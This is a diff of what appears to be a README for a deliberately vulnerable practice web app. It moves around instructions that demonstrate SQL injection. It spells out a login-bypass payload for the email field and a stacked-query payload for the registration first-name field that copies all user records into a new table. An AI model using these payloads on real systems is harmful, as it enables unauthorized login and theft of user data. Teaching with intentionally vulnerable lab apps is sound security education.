@@ -11,18 +11,18 @@ open terminal -> cd cyber-client-vulnerable -> npm start
 (make sure you run mysql)
 
 SQL injection:
-login:
-email- ' OR '1'='1' -- (IMPORTANT: HAVE A SPACE IN THE LAST CHAR) 
-password- anything
-
-The injection will let the hacker to log in without valid credantials
-
 register:
 in the first name field:
 test', 'last', 'email@test.com', 'Secpass123','pkg'); CREATE TABLE users_hacked AS SELECT * FROM users; -- 
 (the rest doesnt matter)
 
 The injection will let the hacker to create users_hacked table in the database with all the users info from the original table
+
+login:
+email- ' OR '1'='1' -- (IMPORTANT: HAVE A SPACE IN THE LAST CHAR) 
+password- anything
+
+The injection will let the hacker to log in without valid credantials
 
 
 add client-
